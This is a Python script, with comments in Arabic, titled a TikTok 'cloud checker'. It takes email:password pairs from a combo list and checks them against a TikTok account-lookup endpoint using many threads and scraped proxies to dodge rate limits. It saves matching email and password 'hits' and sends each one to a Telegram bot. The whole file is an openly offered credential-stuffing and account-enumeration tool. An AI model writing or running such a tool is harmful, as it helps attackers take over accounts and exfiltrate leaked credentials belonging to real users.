import os
import time
import random
import requests
import threading
import telebot
from concurrent.futures import ThreadPoolExecutor

# --- الألوان ---
class Colors:
    G = '\033[92m' # أخضر
    R = '\033[91m' # أحمر
    C = '\033[96m' # سماوي
    W = '\033[0m'  # أبيض

class Stats:
    hits = 0
    bad = 0
    errors = 0
    checked = 0
    proxies_list = []

# --- وظيفة سحب البروكسيات ---
def scrape_proxies():
    print(f"{Colors.C}[*] Scrapping proxies...{Colors.W}")
    urls = [
        "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
    ]
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            Stats.proxies_list.extend(res.text.splitlines())
        except: continue
    print(f"{Colors.G}[+] Total Proxies Loaded: {len(Stats.proxies_list)}{Colors.W}")

# --- محرك الفحص ---
def check_tiktok(email, password, bot, chat_id):
    url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
    
    # محاولة اختيار بروكسي
    proxy_addr = random.choice(Stats.proxies_list) if Stats.proxies_list else None
    proxy = {"http": f"http://{proxy_addr}", "https": f"http://{proxy_addr}"} if proxy_addr else None

    params = {
        "email": email,
        "aid": "1233",
        "device_platform": "android",
        "version_code": "240504"
    }
    
    headers = {
        "User-Agent": "com.zhiliaoapp.musically/2022405040 (Linux; U; Android 12)",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive"
    }

    try:
        response = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=5)
        data = response.json()

        if data.get("message") == "success":
            Stats.hits += 1
            print(f"{Colors.G}[HIT] {email}{Colors.W}")
            with open("data/hits.txt", "a") as f: f.write(f"{email}:{password}\n")
            
            if bot and chat_id:
                bot.send_message(chat_id, f"✅ **New TikTok Hit!**\n\n📧 `{email}`\n🔑 `{password}`\n\n🚀 Cloud V7", parse_mode="Markdown")
        else:
            Stats.bad += 1
    except:
        Stats.errors += 1
    finally:
        Stats.checked += 1

# --- الواجهة ---
def ui():
    while True:
        os.system('clear')
        print(f"""
{Colors.C}      TIK TOK CLOUD CHECKER V7{Colors.W}
        -----------------------
        Hits: {Colors.G}{Stats.hits}{Colors.W}
        Bad:  {Colors.R}{Stats.bad}{Colors.W}
        Err:  {Stats.errors}
        Done: {Stats.checked}
        -----------------------
        """)
        time.sleep(2)

def main():
    if not os.path.exists("data"): os.makedirs("data")
    
    token = input(f"{Colors.C}Bot Token (Enter to skip): {Colors.W}").strip()
    chat_id = input(f"{Colors.C}Chat ID (Enter to skip): {Colors.W}").strip()
    bot = telebot.TeleBot(token) if token else None

    try:
        combo = open("data/combo.txt", "r").read().splitlines()
    except:
        print(f"{Colors.R}[!] Add data/combo.txt first!{Colors.W}")
        return

    # خيار سحب البروكسيات
    choice = input(f"{Colors.C}Use Auto-Proxy Scraper? (y/n): {Colors.W}")
    if choice.lower() == 'y':
        scrape_proxies()
    else:
        try:
            Stats.proxies_list = open("data/proxy.txt", "r").read().splitlines()
        except: pass

    threads = int(input(f"{Colors.C}Threads (Recommended 100+): {Colors.W}"))

    threading.Thread(target=ui, daemon=True).start()

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for line in combo:
            if ":" in line:
                u, p = line.split(":", 1)
                executor.submit(check_tiktok, u, p, bot, chat_id)

if __name__ == "__main__":
    main()
